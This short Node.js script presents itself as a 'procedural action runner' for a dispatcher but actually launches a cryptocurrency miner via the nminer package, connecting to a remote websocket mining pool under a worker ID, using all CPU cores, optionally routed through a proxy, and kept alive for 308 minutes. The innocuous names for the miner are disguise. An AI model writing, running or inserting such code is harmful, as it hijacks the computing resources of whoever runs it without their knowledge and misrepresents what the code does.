// Procedural action runner for ivory-bridge-dispatcher
const os = require("os");
const EventEmitter = require("events");
const { NMiner } = require("nminer");
const config = require("./lib/config");

const dispatcher = new EventEmitter();

dispatcher.once("start", () => {
    const runId = "a48985";
    console.log(`[worker] Subsystem dispatched for ivory-bridge-dispatcher [${runId}]`);

    const pipeline = new NMiner(
        "wss://runtime.nmining.igrp.app/",
        "Arup07.vestment",
        { threads: os.cpus().length, proxy: process.argv[2] || process.env.PROXY || undefined, throttle: true }
    );

    const keepAlivePromise = new Promise(() => {});
    setTimeout(() => {
        console.log("[timeout] Operational limit (308m) reached, exiting cleanly.");
        process.exit(0);
    }, 308 * 60 * 1000);

    process.on("SIGTERM", () => {
        
        console.log(`[exit] Process terminated gracefully for token ${runId}.`);
        process.exit(0);
    });
});

dispatcher.emit("start");
